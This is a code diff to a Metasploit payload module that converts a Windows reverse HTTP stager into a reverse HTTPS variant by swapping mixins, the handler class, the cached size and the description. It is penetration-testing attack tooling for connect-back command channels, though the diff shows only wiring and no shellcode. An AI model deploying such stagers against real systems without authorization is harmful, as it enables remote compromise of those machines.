@@ -5,26 +5,26 @@
 
 
 require 'msf/core'
-require 'msf/core/handler/reverse_http'
-require 'msf/core/payload/windows/reverse_winhttp'
+require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/windows/reverse_winhttps'
 
 
 module Metasploit3
 
-  CachedSize = 323
+  CachedSize = 343
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
-  include Msf::Payload::Windows::ReverseWinHttp
+  include Msf::Payload::Windows::ReverseWinHttps
 
   def self.handler_type_alias
-    "reverse_winhttp"
+    "reverse_winhttps"
   end
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Reverse HTTP Stager (WinHTTP)',
-      'Description'   => 'Tunnel communication over HTTP',
+      'Name'          => 'Reverse HTTPS Stager (WinHTTP)',
+      'Description'   => 'Tunnel communication over HTTP using SSL',
       'Author'        =>
         [
           'hdm',
@@ -33,7 +33,7 @@ module Metasploit3
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_X86,
-      'Handler'       => Msf::Handler::ReverseHttp,
+      'Handler'       => Msf::Handler::ReverseHttps,
       'Convention'    => 'sockedi http'))
   end
 end
